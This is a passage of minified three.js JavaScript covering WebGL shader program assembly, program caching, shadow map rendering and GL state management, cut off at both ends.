enable\":\"\",a.drawBuffers&&c.get(\"WEBGL_draw_buffers\")?\"#extension GL_EXT_draw_buffers : require\":\"\",(a.shaderTextureLOD||b.envMap)&&c.get(\"EXT_shader_texture_lod\")?\"#extension GL_EXT_shader_texture_lod : enable\":\n\"\"].filter(g).join(\"\\n\")}function f(a){var b=[],c;for(c in a){var d=a[c];!1!==d&&b.push(\"#define \"+c+\" \"+d)}return b.join(\"\\n\")}function g(a){return\"\"!==a}function h(a,b){return a.replace(/NUM_DIR_LIGHTS/g,b.numDirLights).replace(/NUM_SPOT_LIGHTS/g,b.numSpotLights).replace(/NUM_POINT_LIGHTS/g,b.numPointLights).replace(/NUM_HEMI_LIGHTS/g,b.numHemiLights)}function k(a){return a.replace(/#include +<([\\w\\d.]+)>/g,function(a,b){var c=THREE.ShaderChunk[b];if(void 0===c)throw Error(\"Can not resolve #include <\"+\nb+\">\");return k(c)})}function l(a){return a.replace(/for \\( int i \\= (\\d+)\\; i < (\\d+)\\; i \\+\\+ \\) \\{([\\s\\S]+?)(?=\\})\\}/g,function(a,b,c,d){a=\"\";for(b=parseInt(b);b<parseInt(c);b++)a+=d.replace(/\\[ i \\]/g,\"[ \"+b+\" ]\");return a})}var n=0;return function(a,m,q,r){var s=a.context,t=q.extensions,u=q.defines,v=q.__webglShader.vertexShader,C=q.__webglShader.fragmentShader,w=\"SHADOWMAP_TYPE_BASIC\";r.shadowMapType===THREE.PCFShadowMap?w=\"SHADOWMAP_TYPE_PCF\":r.shadowMapType===THREE.PCFSoftShadowMap&&(w=\"SHADOWMAP_TYPE_PCF_SOFT\");\nvar E=\"ENVMAP_TYPE_CUBE\",z=\"ENVMAP_MODE_REFLECTION\",y=\"ENVMAP_BLENDING_MULTIPLY\";if(r.envMap){switch(q.envMap.mapping){case THREE.CubeReflectionMapping:case THREE.CubeRefractionMapping:E=\"ENVMAP_TYPE_CUBE\";break;case THREE.CubeUVReflectionMapping:case THREE.CubeUVRefractionMapping:E=\"ENVMAP_TYPE_CUBE_UV\";break;case THREE.EquirectangularReflectionMapping:case THREE.EquirectangularRefractionMapping:E=\"ENVMAP_TYPE_EQUIREC\";break;case THREE.SphericalReflectionMapping:E=\"ENVMAP_TYPE_SPHERE\"}switch(q.envMap.mapping){case THREE.CubeRefractionMapping:case THREE.EquirectangularRefractionMapping:z=\n\"ENVMAP_MODE_REFRACTION\"}switch(q.combine){case THREE.MultiplyOperation:y=\"ENVMAP_BLENDING_MULTIPLY\";break;case THREE.MixOperation:y=\"ENVMAP_BLENDING_MIX\";break;case THREE.AddOperation:y=\"ENVMAP_BLENDING_ADD\"}}var A=0<a.gammaFactor?a.gammaFactor:1,t=e(t,r,a.extensions),I=f(u),B=s.createProgram();q instanceof THREE.RawShaderMaterial?(u=[I].filter(g).join(\"\\n\"),w=[I].filter(g).join(\"\\n\")):(u=[\"precision \"+r.precision+\" float;\",\"precision \"+r.precision+\" int;\",\"#define SHADER_NAME \"+q.__webglShader.name,\nI,r.supportsVertexTextures?\"#define VERTEX_TEXTURES\":\"\",\"#define GAMMA_FACTOR \"+A,\"#define MAX_BONES \"+r.maxBones,r.map?\"#define USE_MAP\":\"\",r.envMap?\"#define USE_ENVMAP\":\"\",r.envMap?\"#define \"+z:\"\",r.lightMap?\"#define USE_LIGHTMAP\":\"\",r.aoMap?\"#define USE_AOMAP\":\"\",r.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",r.bumpMap?\"#define USE_BUMPMAP\":\"\",r.normalMap?\"#define USE_NORMALMAP\":\"\",r.displacementMap&&r.supportsVertexTextures?\"#define USE_DISPLACEMENTMAP\":\"\",r.specularMap?\"#define USE_SPECULARMAP\":\n\"\",r.roughnessMap?\"#define USE_ROUGHNESSMAP\":\"\",r.metalnessMap?\"#define USE_METALNESSMAP\":\"\",r.alphaMap?\"#define USE_ALPHAMAP\":\"\",r.vertexColors?\"#define USE_COLOR\":\"\",r.flatShading?\"#define FLAT_SHADED\":\"\",r.skinning?\"#define USE_SKINNING\":\"\",r.useVertexTexture?\"#define BONE_TEXTURE\":\"\",r.morphTargets?\"#define USE_MORPHTARGETS\":\"\",r.morphNormals&&!1===r.flatShading?\"#define USE_MORPHNORMALS\":\"\",r.doubleSided?\"#define DOUBLE_SIDED\":\"\",r.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+\nr.numClippingPlanes,r.shadowMapEnabled?\"#define USE_SHADOWMAP\":\"\",r.shadowMapEnabled?\"#define \"+w:\"\",r.sizeAttenuation?\"#define USE_SIZEATTENUATION\":\"\",r.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",r.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\"#define USE_LOGDEPTHBUF_EXT\":\"\",\"uniform mat4 modelMatrix;\",\"uniform mat4 modelViewMatrix;\",\"uniform mat4 projectionMatrix;\",\"uniform mat4 viewMatrix;\",\"uniform mat3 normalMatrix;\",\"uniform vec3 cameraPosition;\",\"attribute vec3 position;\",\n\"attribute vec3 normal;\",\"attribute vec2 uv;\",\"#ifdef USE_COLOR\",\"\\tattribute vec3 color;\",\"#endif\",\"#ifdef USE_MORPHTARGETS\",\"\\tattribute vec3 morphTarget0;\",\"\\tattribute vec3 morphTarget1;\",\"\\tattribute vec3 morphTarget2;\",\"\\tattribute vec3 morphTarget3;\",\"\\t#ifdef USE_MORPHNORMALS\",\"\\t\\tattribute vec3 morphNormal0;\",\"\\t\\tattribute vec3 morphNormal1;\",\"\\t\\tattribute vec3 morphNormal2;\",\"\\t\\tattribute vec3 morphNormal3;\",\"\\t#else\",\"\\t\\tattribute vec3 morphTarget4;\",\"\\t\\tattribute vec3 morphTarget5;\",\n\"\\t\\tattribute vec3 morphTarget6;\",\"\\t\\tattribute vec3 morphTarget7;\",\"\\t#endif\",\"#endif\",\"#ifdef USE_SKINNING\",\"\\tattribute vec4 skinIndex;\",\"\\tattribute vec4 skinWeight;\",\"#endif\",\"\\n\"].filter(g).join(\"\\n\"),w=[t,\"precision \"+r.precision+\" float;\",\"precision \"+r.precision+\" int;\",\"#define SHADER_NAME \"+q.__webglShader.name,I,r.alphaTest?\"#define ALPHATEST \"+r.alphaTest:\"\",\"#define GAMMA_FACTOR \"+A,r.useFog&&r.fog?\"#define USE_FOG\":\"\",r.useFog&&r.fogExp?\"#define FOG_EXP2\":\"\",r.map?\"#define USE_MAP\":\n\"\",r.envMap?\"#define USE_ENVMAP\":\"\",r.envMap?\"#define \"+E:\"\",r.envMap?\"#define \"+z:\"\",r.envMap?\"#define \"+y:\"\",r.lightMap?\"#define USE_LIGHTMAP\":\"\",r.aoMap?\"#define USE_AOMAP\":\"\",r.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",r.bumpMap?\"#define USE_BUMPMAP\":\"\",r.normalMap?\"#define USE_NORMALMAP\":\"\",r.specularMap?\"#define USE_SPECULARMAP\":\"\",r.roughnessMap?\"#define USE_ROUGHNESSMAP\":\"\",r.metalnessMap?\"#define USE_METALNESSMAP\":\"\",r.alphaMap?\"#define USE_ALPHAMAP\":\"\",r.vertexColors?\"#define USE_COLOR\":\n\"\",r.flatShading?\"#define FLAT_SHADED\":\"\",r.doubleSided?\"#define DOUBLE_SIDED\":\"\",r.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+r.numClippingPlanes,r.shadowMapEnabled?\"#define USE_SHADOWMAP\":\"\",r.shadowMapEnabled?\"#define \"+w:\"\",r.premultipliedAlpha?\"#define PREMULTIPLIED_ALPHA\":\"\",r.physicallyCorrectLights?\"#define PHYSICALLY_CORRECT_LIGHTS\":\"\",r.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",r.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\"#define USE_LOGDEPTHBUF_EXT\":\n\"\",r.envMap&&a.extensions.get(\"EXT_shader_texture_lod\")?\"#define TEXTURE_LOD_EXT\":\"\",\"uniform mat4 viewMatrix;\",\"uniform vec3 cameraPosition;\",r.toneMapping!==THREE.NoToneMapping?\"#define TONE_MAPPING\":\"\",r.toneMapping!==THREE.NoToneMapping?THREE.ShaderChunk.tonemapping_pars_fragment:\"\",r.toneMapping!==THREE.NoToneMapping?d(\"toneMapping\",r.toneMapping):\"\",r.outputEncoding||r.mapEncoding||r.envMapEncoding||r.emissiveMapEncoding?THREE.ShaderChunk.encodings_pars_fragment:\"\",r.mapEncoding?b(\"mapTexelToLinear\",\nr.mapEncoding):\"\",r.envMapEncoding?b(\"envMapTexelToLinear\",r.envMapEncoding):\"\",r.emissiveMapEncoding?b(\"emissiveMapTexelToLinear\",r.emissiveMapEncoding):\"\",r.outputEncoding?c(\"linearToOutputTexel\",r.outputEncoding):\"\",r.depthPacking?\"#define DEPTH_PACKING \"+q.depthPacking:\"\",\"\\n\"].filter(g).join(\"\\n\"));v=k(v,r);v=h(v,r);C=k(C,r);C=h(C,r);!1===q instanceof THREE.ShaderMaterial&&(v=l(v),C=l(C));C=w+C;v=THREE.WebGLShader(s,s.VERTEX_SHADER,u+v);C=THREE.WebGLShader(s,s.FRAGMENT_SHADER,C);s.attachShader(B,\nv);s.attachShader(B,C);void 0!==q.index0AttributeName?s.bindAttribLocation(B,0,q.index0AttributeName):!0===r.morphTargets&&s.bindAttribLocation(B,0,\"position\");s.linkProgram(B);r=s.getProgramInfoLog(B);E=s.getShaderInfoLog(v);z=s.getShaderInfoLog(C);A=y=!0;if(!1===s.getProgramParameter(B,s.LINK_STATUS))y=!1,console.error(\"THREE.WebGLProgram: shader error: \",s.getError(),\"gl.VALIDATE_STATUS\",s.getProgramParameter(B,s.VALIDATE_STATUS),\"gl.getProgramInfoLog\",r,E,z);else if(\"\"!==r)console.warn(\"THREE.WebGLProgram: gl.getProgramInfoLog()\",\nr);else if(\"\"===E||\"\"===z)A=!1;A&&(this.diagnostics={runnable:y,material:q,programLog:r,vertexShader:{log:E,prefix:u},fragmentShader:{log:z,prefix:w}});s.deleteShader(v);s.deleteShader(C);var F;this.getUniforms=function(){void 0===F&&(F=new THREE.WebGLUniforms(s,B,a));return F};var K;this.getAttributes=function(){if(void 0===K){for(var a={},b=s.getProgramParameter(B,s.ACTIVE_ATTRIBUTES),c=0;c<b;c++){var d=s.getActiveAttrib(B,c).name;a[d]=s.getAttribLocation(B,d)}K=a}return K};this.destroy=function(){s.deleteProgram(B);\nthis.program=void 0};Object.defineProperties(this,{uniforms:{get:function(){console.warn(\"THREE.WebGLProgram: .uniforms is now .getUniforms().\");return this.getUniforms()}},attributes:{get:function(){console.warn(\"THREE.WebGLProgram: .attributes is now .getAttributes().\");return this.getAttributes()}}});this.id=n++;this.code=m;this.usedTimes=1;this.program=B;this.vertexShader=v;this.fragmentShader=C;return this}}();\nTHREE.WebGLPrograms=function(a,b){function c(a,b){var c;a?a instanceof THREE.Texture?c=a.encoding:a instanceof THREE.WebGLRenderTarget&&(console.warn(\"THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead.\"),c=a.texture.encoding):c=THREE.LinearEncoding;c===THREE.LinearEncoding&&b&&(c=THREE.GammaEncoding);return c}var d=[],e={MeshDepthMaterial:\"depth\",MeshNormalMaterial:\"normal\",MeshBasicMaterial:\"basic\",MeshLambertMaterial:\"lambert\",\nMeshPhongMaterial:\"phong\",MeshStandardMaterial:\"physical\",MeshPhysicalMaterial:\"physical\",LineBasicMaterial:\"basic\",LineDashedMaterial:\"dashed\",PointsMaterial:\"points\"},f=\"precision supportsVertexTextures map mapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap displacementMap specularMap roughnessMap metalnessMap alphaMap combine vertexColors fog useFog fogExp flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes depthPacking\".split(\" \");\nthis.getParameters=function(d,f,k,l,n){var p=e[d.type],m;b.floatVertexTextures&&n&&n.skeleton&&n.skeleton.useVertexTexture?m=1024:(m=Math.floor((b.maxVertexUniforms-20)/4),void 0!==n&&n instanceof THREE.SkinnedMesh&&(m=Math.min(n.skeleton.bones.length,m),m<n.skeleton.bones.length&&console.warn(\"WebGLRenderer: too many bones - \"+n.skeleton.bones.length+\", this GPU supports just \"+m+\" (try OpenGL instead of ANGLE)\")));var q=a.getPrecision();null!==d.precision&&(q=b.getMaxPrecision(d.precision),q!==\nd.precision&&console.warn(\"THREE.WebGLProgram.getParameters:\",d.precision,\"not supported, using\",q,\"instead.\"));var r=a.getCurrentRenderTarget();return{shaderID:p,precision:q,supportsVertexTextures:b.vertexTextures,outputEncoding:c(r?r.texture:null,a.gammaOutput),map:!!d.map,mapEncoding:c(d.map,a.gammaInput),envMap:!!d.envMap,envMapMode:d.envMap&&d.envMap.mapping,envMapEncoding:c(d.envMap,a.gammaInput),envMapCubeUV:!!d.envMap&&(d.envMap.mapping===THREE.CubeUVReflectionMapping||d.envMap.mapping===\nTHREE.CubeUVRefractionMapping),lightMap:!!d.lightMap,aoMap:!!d.aoMap,emissiveMap:!!d.emissiveMap,emissiveMapEncoding:c(d.emissiveMap,a.gammaInput),bumpMap:!!d.bumpMap,normalMap:!!d.normalMap,displacementMap:!!d.displacementMap,roughnessMap:!!d.roughnessMap,metalnessMap:!!d.metalnessMap,specularMap:!!d.specularMap,alphaMap:!!d.alphaMap,combine:d.combine,vertexColors:d.vertexColors,fog:k,useFog:d.fog,fogExp:k instanceof THREE.FogExp2,flatShading:d.shading===THREE.FlatShading,sizeAttenuation:d.sizeAttenuation,\nlogarithmicDepthBuffer:b.logarithmicDepthBuffer,skinning:d.skinning,maxBones:m,useVertexTexture:b.floatVertexTextures&&n&&n.skeleton&&n.skeleton.useVertexTexture,morphTargets:d.morphTargets,morphNormals:d.morphNormals,maxMorphTargets:a.maxMorphTargets,maxMorphNormals:a.maxMorphNormals,numDirLights:f.directional.length,numPointLights:f.point.length,numSpotLights:f.spot.length,numHemiLights:f.hemi.length,numClippingPlanes:l,shadowMapEnabled:a.shadowMap.enabled&&n.receiveShadow&&0<f.shadows.length,shadowMapType:a.shadowMap.type,\ntoneMapping:a.toneMapping,physicallyCorrectLights:a.physicallyCorrectLights,premultipliedAlpha:d.premultipliedAlpha,alphaTest:d.alphaTest,doubleSided:d.side===THREE.DoubleSide,flipSided:d.side===THREE.BackSide,depthPacking:void 0!==d.depthPacking?d.depthPacking:!1}};this.getProgramCode=function(a,b){var c=[];b.shaderID?c.push(b.shaderID):(c.push(a.fragmentShader),c.push(a.vertexShader));if(void 0!==a.defines)for(var d in a.defines)c.push(d),c.push(a.defines[d]);for(d=0;d<f.length;d++)c.push(b[f[d]]);\nreturn c.join()};this.acquireProgram=function(b,c,e){for(var f,n=0,p=d.length;n<p;n++){var m=d[n];if(m.code===e){f=m;++f.usedTimes;break}}void 0===f&&(f=new THREE.WebGLProgram(a,e,b,c),d.push(f));return f};this.releaseProgram=function(a){if(0===--a.usedTimes){var b=d.indexOf(a);d[b]=d[d.length-1];d.pop();a.destroy()}};this.programs=d};\nTHREE.WebGLProperties=function(){var a={};this.get=function(b){b=b.uuid;var c=a[b];void 0===c&&(c={},a[b]=c);return c};this.delete=function(b){delete a[b.uuid]};this.clear=function(){a={}}};\nTHREE.WebGLShader=function(){function a(a){a=a.split(\"\\n\");for(var c=0;c<a.length;c++)a[c]=c+1+\": \"+a[c];return a.join(\"\\n\")}return function(b,c,d){var e=b.createShader(c);b.shaderSource(e,d);b.compileShader(e);!1===b.getShaderParameter(e,b.COMPILE_STATUS)&&console.error(\"THREE.WebGLShader: Shader couldn't compile.\");\"\"!==b.getShaderInfoLog(e)&&console.warn(\"THREE.WebGLShader: gl.getShaderInfoLog()\",c===b.VERTEX_SHADER?\"vertex\":\"fragment\",b.getShaderInfoLog(e),a(d));return e}}();\nTHREE.WebGLShadowMap=function(a,b,c){function d(b,c,d,e){var f=b.geometry,g=null,g=r,h=b.customDepthMaterial;d&&(g=s,h=b.customDistanceMaterial);h?g=h:(b=b instanceof THREE.SkinnedMesh&&c.skinning,h=0,void 0!==f.morphTargets&&0<f.morphTargets.length&&c.morphTargets&&(h|=1),b&&(h|=2),g=g[h]);a.localClippingEnabled&&!0===c.clipShadows&&0!==c.clippingPlanes.length&&(h=g.uuid,f=c.uuid,b=t[h],void 0===b&&(b={},t[h]=b),h=b[f],void 0===h&&(h=g.clone(),b[f]=h),g=h);g.visible=c.visible;g.wireframe=c.wireframe;\nf=c.side;B.renderSingleSided&&f==THREE.DoubleSide&&(f=THREE.FrontSide);B.renderReverseSided&&(f===THREE.FrontSide?f=THREE.BackSide:f===THREE.BackSide&&(f=THREE.FrontSide));g.side=f;g.clipShadows=c.clipShadows;g.clippingPlanes=c.clippingPlanes;g.wireframeLinewidth=c.wireframeLinewidth;g.linewidth=c.linewidth;d&&void 0!==g.uniforms.lightPos&&g.uniforms.lightPos.value.copy(e);return g}function e(a,b,c){if(!1!==a.visible){a.layers.test(b.layers)&&(a instanceof THREE.Mesh||a instanceof THREE.Line||a instanceof\nTHREE.Points)&&a.castShadow&&(!1===a.frustumCulled||!0===h.intersectsObject(a))&&!0===a.material.visible&&(a.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,a.matrixWorld),q.push(a));a=a.children;for(var d=0,f=a.length;d<f;d++)e(a[d],b,c)}}var f=a.context,g=a.state,h=new THREE.Frustum,k=new THREE.Matrix4,l=b.shadows,n=new THREE.Vector2,p=new THREE.Vector3,m=new THREE.Vector3,q=[],r=Array(4),s=Array(4),t={},u=[new THREE.Vector3(1,0,0),new THREE.Vector3(-1,0,0),new THREE.Vector3(0,0,1),new THREE.Vector3(0,\n0,-1),new THREE.Vector3(0,1,0),new THREE.Vector3(0,-1,0)],v=[new THREE.Vector3(0,1,0),new THREE.Vector3(0,1,0),new THREE.Vector3(0,1,0),new THREE.Vector3(0,1,0),new THREE.Vector3(0,0,1),new THREE.Vector3(0,0,-1)],C=[new THREE.Vector4,new THREE.Vector4,new THREE.Vector4,new THREE.Vector4,new THREE.Vector4,new THREE.Vector4];b=new THREE.MeshDepthMaterial;b.depthPacking=THREE.RGBADepthPacking;b.clipping=!0;for(var w=THREE.ShaderLib.distanceRGBA,E=THREE.UniformsUtils.clone(w.uniforms),z=0;4!==z;++z){var y=\n0!==(z&1),A=0!==(z&2),I=b.clone();I.morphTargets=y;I.skinning=A;r[z]=I;y=new THREE.ShaderMaterial({defines:{USE_SHADOWMAP:\"\"},uniforms:E,vertexShader:w.vertexShader,fragmentShader:w.fragmentShader,morphTargets:y,skinning:A,clipping:!0});s[z]=y}var B=this;this.enabled=!1;this.autoUpdate=!0;this.needsUpdate=!1;this.type=THREE.PCFShadowMap;this.renderSingleSided=this.renderReverseSided=!0;this.render=function(b,r){if(!1!==B.enabled&&(!1!==B.autoUpdate||!1!==B.needsUpdate)&&0!==l.length){g.clearColor(1,\n1,1,1);g.disable(f.BLEND);g.setDepthTest(!0);g.setScissorTest(!1);for(var w,s,t=0,y=l.length;t<y;t++){var z=l[t],A=z.shadow;if(void 0===A)console.warn(\"THREE.WebGLShadowMap:\",z,\"has no shadow.\");else{var E=A.camera;n.copy(A.mapSize);if(z instanceof THREE.PointLight){w=6;s=!0;var J=n.x,D=n.y;C[0].set(2*J,D,J,D);C[1].set(0,D,J,D);C[2].set(3*J,D,J,D);C[3].set(J,D,J,D);C[4].set(3*J,0,J,D);C[5].set(J,0,J,D);n.x*=4;n.y*=2}else w=1,s=!1;null===A.map&&(A.map=new THREE.WebGLRenderTarget(n.x,n.y,{minFilter:THREE.NearestFilter,\nmagFilter:THREE.NearestFilter,format:THREE.RGBAFormat}),E.updateProjectionMatrix());A instanceof THREE.SpotLightShadow&&A.update(z);J=A.map;A=A.matrix;m.setFromMatrixPosition(z.matrixWorld);E.position.copy(m);a.setRenderTarget(J);a.clear();for(J=0;J<w;J++){s?(p.copy(E.position),p.add(u[J]),E.up.copy(v[J]),E.lookAt(p),g.viewport(C[J])):(p.setFromMatrixPosition(z.target.matrixWorld),E.lookAt(p));E.updateMatrixWorld();E.matrixWorldInverse.getInverse(E.matrixWorld);A.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,\n0,0,0,1);A.multiply(E.projectionMatrix);A.multiply(E.matrixWorldInverse);k.multiplyMatrices(E.projectionMatrix,E.matrixWorldInverse);h.setFromMatrix(k);q.length=0;e(b,r,E);for(var D=0,G=q.length;D<G;D++){var I=q[D],T=c.update(I),X=I.material;if(X instanceof THREE.MultiMaterial)for(var ja=T.groups,X=X.materials,ba=0,ia=ja.length;ba<ia;ba++){var V=ja[ba],Y=X[V.materialIndex];!0===Y.visible&&(Y=d(I,Y,s,m),a.renderBufferDirect(E,null,T,Y,I,V))}else Y=d(I,X,s,m),a.renderBufferDirect(E,null,T,Y,I,null)}}}}w=\na.getClearColor();s=a.getClearAlpha();a.setClearColor(w,s);B.needsUpdate=!1}}};\nTHREE.WebGLState=function(a,b,c){function d(b,c,d){var e=new Uint8Array(4),f=a.createTexture();a.bindTexture(b,f);a.texParameteri(b,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(b,a.TEXTURE_MAG_FILTER,a.NEAREST);for(b=0;b<d;b++)a.texImage2D(c+b,0,a.RGBA,1,1,0,a.RGBA,a.UNSIGNED_BYTE,e);return f}var e=this;this.buffers={color:new THREE.WebGLColorBuffer(a,this),depth:new THREE.WebGLDepthBuffer(a,this),stencil:new THREE.WebGLStencilBuffer(a,this)};var f=a.getParameter(a.MAX_VERTEX_ATTRIBS),g=new Uint8Array(f),\nh=new Uint8Array(f),k=new Uint8Array(f),l={},n=null,p=null,m=null,q=null,r=null,s=null,t=null,u=null,v=!1,C=null,w=null,E=null,z=null,y=null,A=null,I=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),B=null,F={},K=new THREE.Vector4,P=new THREE.Vector4,M={};M[a.TEXTURE_2D]=d(a.TEXTURE_2D,a.TEXTURE_2D,1);M[a.TEXTURE_CUBE_MAP]=d(a.TEXTURE_CUBE_MAP,a.TEXTURE_CUBE_MAP_POSITIVE_X,6);this.init=function(){this.clearColor(0,0,0,1);this.clearDepth(1);this.clearStencil(0);this.enable(a.DEPTH_TEST);this.setDepthFunc(THREE.LessEqualDepth);\nthis.setFlipSided(!1);this.setCullFace(THREE.CullFaceBack);this.enable(a.CULL_FACE);this.enable(a.BLEND);this.setBlending(THREE.NormalBlending)};this.initAttributes=function(){for(var a=0,b=g.length;a<b;a++)g[a]=0};this.enableAttribute=function(c){g[c]=1;0===h[c]&&(a.enableVertexAttribArray(c),h[c]=1);0!==k[c]&&(b.get(\"ANGLE_instanced_arrays\").vertexAttribDivisorANGLE(c,0),k[c]=0)};this.enableAttributeAndDivisor=function(b,c,d){g[b]=1;0===h[b]&&(a.enableVertexAttribArray(b),h[b]=1);k[b]!==c&&(d.vertexAttribDivisorANGLE(b,\nc),k[b]=c)};this.disableUnusedAttributes=function(){for(var b=0,c=h.length;b!==c;++b)h[b]!==g[b]&&(a.disableVertexAttribArray(b),h[b]=0)};this.enable=function(b){!0!==l[b]&&(a.enable(b),l[b]=!0)};this.disable=function(b){!1!==l[b]&&(a.disable(b),l[b]=!1)};this.getCompressedTextureFormats=function(){if(null===n&&(n=[],b.get(\"WEBGL_compressed_texture_pvrtc\")||b.get(\"WEBGL_compressed_texture_s3tc\")||b.get(\"WEBGL_compressed_texture_etc1\")))for(var c=a.getParameter(a.COMPRESSED_TEXTURE_FORMATS),d=0;d<\nc.length;d++)n.push(c[d]);return n};this.setBlending=function(b,d,e,f,g,h,k,l){if(b!==THREE.NoBlending){this.enable(a.BLEND);if(b!==p||l!==v)b===THREE.AdditiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE,a.ONE,a.ONE)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.SRC_ALPHA,a.ONE)):b===THREE.SubtractiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.ZERO,a.ONE_MINUS_SRC_COLOR,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),\na.blendFunc(a.ZERO,a.ONE_MINUS_SRC_COLOR)):b===THREE.MultiplyBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.SRC_COLOR,a.ZERO,a.SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.SRC_COLOR)):l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.SRC_ALPHA,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)),\np=b,v=l;if(b===THREE.CustomBlending){g=g||d;h=h||e;k=k||f;if(d!==m||g!==s)a.blendEquationSeparate(c(d),c(g)),m=d,s=g;if(e!==q||f!==r||h!==t||k!==u)a.blendFuncSeparate(c(e),c(f),c(h),c(k)),q=e,r=f,t=h,u=k}else u=t=s=r=q=m=null}else this.disable(a.BLEND),p=b};this.setColorWrite=function(a){this.buffers.color.setMask(a)};this.setDepthTest=function(a){this.buffers.depth.setTest(a)};this.setDepthWrite=function(a){this.buffers.depth.setMask(a)};this.setDepthFunc=function(a){this.buffers.depth.setFunc(a)};\nthis.setStencilTest=function(a){this.buffers.stencil.setTest(a)};this.setStencilWrite=function(a){this.buffers.stencil.setMask(a)};this.setStencilFunc=function(a,b,c){this.buffers.stencil.setFunc(a,b,c)};this.setStencilOp=function(a,b,c){this.buffers.stencil.setOp(a,b,c)};this.setFlipSided=function(b){C!==b&&(b?a.frontFace(a.CW):a.frontFace(a.CCW),C=b)};this.setCullFace=function(b){b!==THREE.CullFaceNone?(this.enable(a.CULL_FACE),b!==w&&(b===THREE.CullFaceBack?a.cullFace(a.BACK):b===THREE.CullFaceFront?\na.cullFace(a.FRONT):a.cullFace(a.FRONT_AND_BACK))):this.disable(a.CULL_FACE);w=b};this.setLineWidth=function(b){b!==E&&(a.lineWidth(b),E=b)};this.setPolygonOffset=function(b,c,d){if(b){if(this.enable(a.POLYGON_OFFSET_FILL),z!==c||y!==d)a.polygonOffset(c,d),z=c,y=d}else this.disable(a.POLYGON_OFFSET_FILL)};this.getScissorTest=function(){return A};this.setScissorTest=function(b){(A=b)?this.enable(a.SCISSOR_TEST):this.disable(a.SCISSOR_TEST)};this.activeTexture=function(b){void 0===b&&(b=a.TEXTURE0+\nI-1);B!==b&&(a.activeTexture(b),B=b)};this.bindTexture=function(b,c){null===B&&e.activeTexture();var d=F[B];void 0===d&&(d={type:void 0,texture:void 0},F[B]=d);if(d.type!==b||d.texture!==c)a.bindTexture(b,c||M[b]),d.type=b,d.texture=c};this.compressedTexImage2D=function(){try{a.compressedTexImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.texImage2D=function(){try{a.texImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.clearColor=function(a,b,c,d){this.buffers.color.setClear(a,\nb,c,d)};this.clearDepth=function(a){this.buffers.depth.setClear(a)};this.clearStencil=function(a){this.buffers.stencil.setClear(a)};this.scissor=function(b){!1===K.equals(b)&&(a.scissor(b.x,b.y,b.z,b.w),K.copy(b))};this.viewport=function(b){!1===P.equals(b)&&(a.viewport(b.x,b.y,b.z,b.w),P.copy(b))};this.reset=function(){for(var b=0;b<h.length;b++)1===h[b]&&(a.disableVertexAttribArray(b),h[b]=0);l={};B=n=null;F={};w=C=p=null;this.buffers.color.reset();this.buffers.depth.reset();this.buffers.stencil.reset()}};\nTHREE.WebGLColorBuffer=function(a,b){var c=!1,d=new THREE.Vector4,e=null,f=new THREE.Vector4;this.setMask=function(b){e===b||c||(a.colorMask(b,b,b,b),e=b)};this.setLocked=function(a){c=a};this.setClear=function(b,c,e,l){d.set(b,c,e,l);!1===f.equals(d)&&(a.clearColor(b,c,e,l),f.copy(d))};this.reset=function(){c=!1;e=null;f=new THREE.Vector4}};\nTHREE.WebGLDepthBuffer=function(a,b){var c=!1,d=null,e=null,f=null;this.setTest=function(c){c?b.enable(a.DEPTH_TEST):b.disable(a.DEPTH_TEST)};this.setMask=function(b){d===b||c||(a.depthMask(b),d=b)};this.setFunc=function(b){if(e!==b){if(b)switch(b){case THREE.NeverDepth:a.depthFunc(a.NEVER);break;case THREE.AlwaysDepth:a.depthFunc(a.ALWAYS);break;case THREE.LessDepth:a.depthFunc(a.LESS);break;case THREE.LessEqualDepth:a.depthFunc(a.LEQUAL);break;case THREE.EqualDepth:a.depthFunc(a.EQUAL);break;case THREE.GreaterEqualDepth:a.depthFunc(a.GEQUAL);\nbreak;case THREE.GreaterDepth:a.depthFunc(a.GREATER);break;case THREE.NotEqualDepth:a.depthFunc(a.NOTEQUAL);break;default:a.depthFunc(a.LEQUAL)}else a.depthFunc(a.LEQUAL);e=b}};this.setLocked=function(a){c=a};this.setClear=function(b){f!==b&&(a.clearDepth(b),f=b)};this.reset=function(){c=!1;f=e=d=null}};\nTHREE.WebGLStencilBuffer=function(a,b){var 